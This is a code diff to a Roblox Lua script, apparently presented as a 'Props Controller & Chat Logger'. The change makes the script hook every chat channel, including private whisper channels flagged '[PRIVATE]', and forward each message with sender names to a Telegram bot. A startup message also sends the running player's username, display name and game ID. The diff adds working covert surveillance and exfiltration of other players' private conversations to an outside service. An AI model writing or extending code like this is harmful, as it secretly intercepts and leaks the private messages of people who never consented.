@@ -34,20 +34,39 @@ end
 local startupMessage = "🔔 *Script Executed & Chat Logger Started!*\n\n👤 Username: `" .. playerName .. "`\n🏷️ Display Name: `" .. displayName .. "`\n🎮 Game ID: `" .. game.PlaceId .. "`"
 sendTelegram(startupMessage)
 
-task.spawn(function()
-    local success, channel = pcall(function()
-        return TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
-    end)
+local function setupChannelLogging(channel)
+    channel.MessageReceived:Connect(function(message)
+        local sender = message.TextSource and message.TextSource.Name or "System"
+        local chatText = message.Text
+        local channelName = channel.Name
+        
+        local prefix = "💬"
+        if channelName:find("RBXWhisper") then
+            prefix = "🔒 [PRIVATE]"
+        end
 
-    if success and channel then
-        channel.MessageReceived:Connect(function(message)
-            local sender = message.TextSource and message.TextSource.Name or "System"
-            local chatText = message.Text
-            
-            local formattedMessage = string.format("💬 *[%s]* `%s`: %s", playerName, sender, chatText)
-            sendTelegram(formattedMessage)
-        end)
+        local formattedMessage = string.format("%s *[%s]* `%s`: %s", prefix, playerName, sender, chatText)
+        sendTelegram(formattedMessage)
+    end)
+end
+
+-- Monitor existing and new channels (General and Private Whispers)
+task.spawn(function()
+    local textChannels = TextChatService:WaitForChild("TextChannels")
+
+    -- Log existing channels
+    for _, channel in ipairs(textChannels:GetChildren()) do
+        if channel:IsA("TextChannel") then
+            setupChannelLogging(channel)
+        end
     end
+
+    -- Log new channels (like private whispers created after execution)
+    textChannels.ChildAdded:Connect(function(channel)
+        if channel:IsA("TextChannel") then
+            setupChannelLogging(channel)
+        end
+    end)
 end)
 
-print("Props Controller & Chat Logger berhasil dijalankan oleh: " .. playerName)
+print("Props Controller & Chat Logger (Private Chat Support) berhasil dijalankan oleh: " .. playerName)
